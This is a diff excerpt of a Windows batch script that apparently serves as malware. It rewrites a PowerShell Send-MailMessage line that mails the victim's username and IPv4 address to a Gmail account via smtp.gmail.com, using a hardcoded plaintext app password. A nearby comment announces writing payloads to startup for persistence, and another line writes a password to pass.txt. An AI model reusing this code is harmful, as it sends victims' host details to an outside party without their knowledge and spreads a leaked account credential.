@@ -13,7 +13,7 @@ echo  "Peter1234!@#$" > pass.txt
 
 
 @REM setup smtp
-powershell Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String "tqck alhn siqo dtqz"  -AsPlainText -Force))
+powershell Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String 'tqck alhn siqo dtqz'  -AsPlainText -Force))
 
 
 @REM write payloads to startup
